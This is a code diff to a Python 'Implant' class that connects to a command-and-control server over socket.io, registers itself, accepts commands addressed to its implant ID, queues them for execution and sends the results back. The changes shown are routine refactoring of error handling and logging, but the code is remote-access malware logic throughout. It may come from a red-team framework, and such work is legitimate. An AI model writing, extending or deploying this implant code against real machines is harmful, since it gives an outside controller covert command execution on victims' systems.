@@ -85,20 +85,29 @@ class Implant:
             if data.get('status') == 'success':
                 logger.info("Successfully registered with C2 server")
             else:
-                logger.error(f"Registration failed: {data}")
+                error_msg = data.get('message', 'Unknown error')
+                logger.error(f"Registration failed: {error_msg}")
                 self.sio.disconnect()
         
         @self.sio.on('command')
         def on_command(data):
-            command = data.get('command')
-            implant_id = data.get('implant_id')
-            logger.info(f"Received command event: {data}")
-            
-            if command and implant_id == self.implant_id:
-                logger.info(f"Processing command for this implant: {command}")
-                self.command_queue.put(command)
-            else:
-                logger.warning(f"Ignoring command - implant_id mismatch or missing command. Received: {data}")
+            try:
+                command = data.get('command')
+                implant_id = data.get('implant_id')
+                timestamp = data.get('timestamp')
+                
+                logger.info(f"Received command event: {data}")
+                
+                if command and implant_id == self.implant_id:
+                    logger.info(f"Processing command for this implant: {command}")
+                    self.command_queue.put(command)
+                else:
+                    if implant_id != self.implant_id:
+                        logger.warning(f"Ignoring command - implant_id mismatch. Expected: {self.implant_id}, Received: {implant_id}")
+                    if not command:
+                        logger.warning("Ignoring command - no command provided")
+            except Exception as e:
+                logger.error(f"Error processing command event: {e}")
     
     def register(self):
         """Register with the C2 server"""
@@ -335,7 +344,7 @@ class Implant:
                             'timestamp': datetime.now().isoformat()
                         }
                         logger.info(f"Sending command result to C2 server: {result_data}")
-                        self.sio.emit('command_result', result_data, callback=self._on_result_sent)
+                        self.sio.emit('command_result', result_data)
                     else:
                         logger.error("Cannot send command result: Not connected to C2 server")
                 except Exception as e:
@@ -347,16 +356,12 @@ class Implant:
                             'command': command,
                             'result': error_msg,
                             'timestamp': datetime.now().isoformat()
-                        }, callback=self._on_result_sent)
+                        })
             except queue.Empty:
                 continue
             except Exception as e:
                 logger.error(f"Command worker error: {e}")
                 time.sleep(1)  # Prevent tight loop on error
-
-    def _on_result_sent(self, *args):
-        """Callback for when command result is sent"""
-        logger.info(f"Command result sent successfully: {args}")
 
     def start(self):
         """Start the implant"""
